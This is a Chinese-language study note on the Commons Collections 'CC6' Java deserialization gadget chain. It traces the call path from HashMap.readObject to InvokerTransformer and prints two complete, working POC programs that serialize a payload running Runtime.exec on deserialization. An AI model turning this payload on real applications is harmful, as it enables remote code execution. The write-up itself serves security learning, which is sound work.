---
title: CC6
date: 2025-08-31T15:00:00+08:00
tags:
  - "CC链-反序列化"
categories:
  - "Java安全"
description: Java 反序列化学习 - CC6链
showToc: true
draft: false
tocOpen: true
---
# 环境：
JDK 8u71:

[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)



<font style="color:rgb(80, 80, 92);">Comoons-Collections 3.2.1</font>

#   CC6 链分析：

在 CC1 中分析过 JDK 8u71之后的 AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了，也就是说：

AnnotationInvocationHandler.readObject

AnnotationInvocationHandler.invoke.memberValues.get

这半条链子用不了，所以要找一个替代，这个替代也应该调用了 LazyMap.get 方法，之后的链子和 CC1 一样。



## 1、分析
我们找到 TiedMapEntry.getValue 中调用了 get 方法，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815897.png)

而 TiedMapEntry.hashCode 调用了 getValue ，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815168.png)

那么我们找哪里调用了 TiedMapEntry.hashCode 就可以完成利用链的跟踪

> 这里我用的是《Java 安全漫谈》给出的思路：
>
> ysoserial 中，是利用 java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)，最后到 TiedMapEntry#hashCode()。
>
> 实际上我发现，在 java.util.HashMap#readobject 中就可以找到 HashMap#hash() 的调用，去掉了最前面的两次调用：
>

```java
public class HashMap<K,V> extends AbstractMap<K,V>
    implements Map<K,V>, Cloneable, Serializable {
    ...
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
    ...
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);
            @SuppressWarnings({"rawtypes","unchecked"})
                Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

> 在 HashMap 的 readObject 方法中，调用到了 hash(key），而 hash 方法中，调用到了 key·hashCode(）。所以，我们只需要让这个 key 等于 TiedMapEntry 对象，即可连接上前面的分析过程，构成一个完整的 Gadget。
>



## 2、构造 POC


初步构造：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //回顾 Transformer 链：Runtime.class -> getMethod("getRuntime") -> invoke(null) -> Runtime.getRuntime() -> exec("calc")
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] { "calc" }),
                };

        //创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object, Object> map = new HashMap();
        //在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode
        //这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory
        Map<Object, Object> outerMap = LazyMap.decorate(map, new ConstantTransformer(1));

        // TiedMapEntry.getValue() 调用 outerMap.get("key")
        TiedMapEntry tme = new TiedMapEntry(outerMap, "key");

        //这里要注意 HashMap.put(key, value) 会计算 key.hashCode()
        //所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get("key")，如果 outerMap 的 factory 是恶意的就会被触发
        //但这里我们先使用 ConstantTransformer(1) 无害构造
        Map expMap = new HashMap();
        expMap.put(tme, "value");

        //通过反射获取 LazyMap 类中私有字段 factory
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryFiled = lazyMapClass.getDeclaredField("factory");
        //访问权限置为可访问
        factoryFiled.setAccessible(true);
        //然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer
        //这样就把原先无害的 factory 换成了恶意的 transformer 链
        factoryFiled.set(outerMap,chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}


```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815258.png)



但是执行后无事发生，并没有弹出计算器。



下断点调试：

发现在 <font style="color:#080808;background-color:#ffffff;">if (map.containsKey(key) == false) {  key 的值为 "key"【也就是这一步  TiedMapEntry tme = new TiedMapEntry(outerMap, "key");  】，并没有去执行 factory.transform(key)  。</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815383.png)



在 <font style="color:#080808;background-color:#ffffff;">TiedMapEntry tme = new TiedMapEntry(outerMap, "aaa");  处下断点调试：</font>

<font style="color:#080808;background-color:#ffffff;">可以看到 key 来源于实例化时的传参</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815182.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815348.png)



重新修改 POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //回顾 Transformer 链：Runtime.class -> getMethod("getRuntime") -> invoke(null) -> Runtime.getRuntime() -> exec("calc")
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class }, new String[] { "calc" }),
        };

        //创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object, Object> map = new HashMap();
        //在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode
        //这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory
        Map<Object, Object> outerMap = LazyMap.decorate(map, new ConstantTransformer(1));

        // TiedMapEntry.getValue() 调用 outerMap.get("key")
        TiedMapEntry tme = new TiedMapEntry(outerMap, "aaa");

        //这里要注意 HashMap.put(key, value) 会计算 key.hashCode()
        //所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get("key")，如果 outerMap 的 factory 是恶意的就会被触发
        //但这里我们先使用 ConstantTransformer(1) 无害构造
        Map expMap = new HashMap();
        expMap.put(tme, "value");

        //将 "key" 移除
        map.remove("aaa");

        //通过反射获取 LazyMap 类中私有字段 factory
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryFiled = lazyMapClass.getDeclaredField("factory");
        //访问权限置为可访问
        factoryFiled.setAccessible(true);
        //然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer
        //这样就把原先无害的 factory 换成了恶意的 transformer 链
        factoryFiled.set(outerMap,chainedTransformer);

        serialize(expMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815493.png)

## 3、总结
 利用 `LazyMap` 在取值时会调用其 `factory.transform()`，再借助 `TiedMapEntry` 作为 `HashMap` 的 key，在反序列化时 `HashMap.readObject()` 会触发 key 的 `hashCode()` → `TiedMapEntry.getValue()` → `LazyMap.get()` → 恶意的 `ChainedTransformer`，最终执行任意方法（如 `Runtime.getRuntime().exec("calc")`）  



利用链：

HashMap.readObject

HashMap.hash

TiedMapEntry.hashCode

TiedMapEntry.getValue.<font style="color:#080808;background-color:#ffffff;">get</font>

LazyMap.get

LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font>

ChainedTransformer.transform

ConstantTransformer.transform

InvokerTransformer.transform  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311816402.png)











































